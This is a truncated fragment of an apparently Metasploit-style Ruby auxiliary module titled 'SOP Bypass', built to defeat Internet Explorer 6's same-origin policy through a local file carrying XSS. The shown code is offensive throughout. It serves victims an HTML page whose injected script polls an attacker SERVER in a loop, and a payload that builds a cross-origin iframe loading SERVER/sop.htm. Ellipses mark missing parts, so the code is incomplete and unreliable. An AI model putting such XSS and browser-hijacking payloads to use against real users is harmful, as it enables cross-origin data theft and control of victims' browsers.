...
# Bypassing SOP Restriction with a local file infected with XSS (only for ie 6)
#
class Metasploit3 < Msf::Auxiliary
	...
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'SOP Bypass',
			'Description' => 'Bypassing SOP Restriction with a local file infected with XSS'
		))
	end
			...
			when /sop\.htm/
				code = %Q{<html><body>
					<script>
						...
						script.id = "SOP";
						script.src = SERVER + "loop?interval=1";
				...
				# and SOP can be bypassed (try it with XSS Tunnel).
			else
				code = %Q{
					clearTimeout(victim_loop);		// Kills the first loop

					iframe = createCrossIframe("XSS_SOP", 0, 0);
					iframe.src = SERVER + "/sop.htm";
